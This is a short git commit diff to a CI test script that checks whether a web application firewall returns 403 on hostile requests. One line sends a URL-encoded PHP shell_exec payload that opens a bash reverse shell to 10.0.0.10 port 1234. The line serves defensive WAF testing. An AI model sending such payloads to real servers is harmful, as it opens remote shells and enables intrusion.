c9c7ae4c8e06b4b13131f7f1cb4c5293c84fbee3
justin-p <justin-p@users.noreply.github.com>
2019-04-25 12:53:42 +0200

    testing

--- tests/travis.test.sh
+++ tests/travis.test.sh
@@ -25,7 +25,7 @@ else
 fi
 
 echo "[+] - Checking Shell Exec"
-shell_exec_http_code=$(curl "curl http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -o /dev/null)
+shell_exec_http_code=$(curl "http://localhost:81/SomeFile.php?SomeParam=shell_exec%28%22%2Fbin%2Fbash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.0.0.10%2F1234%200%3E%261%27%22%29" -s -f -w %{http_code} -o /dev/null)
 if (($shell_exec_http_code == 403)); then 
 	echo "We got a $shell_exec_http_code on Shell Exec. Our WAF blocked the reqeust, Noice!"; 
 else 
